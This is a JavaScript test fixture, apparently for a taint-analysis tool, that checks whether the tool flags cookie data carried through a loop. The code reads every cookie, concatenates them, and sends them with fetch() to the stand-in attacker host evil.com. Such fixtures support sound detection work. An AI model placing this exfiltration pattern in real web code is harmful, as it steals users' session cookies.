/**
 * Test: Taint propagation through loop
 * Expected: VULNERABILITY - cookie accumulated in loop to fetch
 */

function test() {
  var result = "";
  var cookies = document.cookie.split(';');
  
  for (var i = 0; i < cookies.length; i++) {
    result += cookies[i];
  }
  
  fetch('https://evil.com?data=' + result);
}

test();
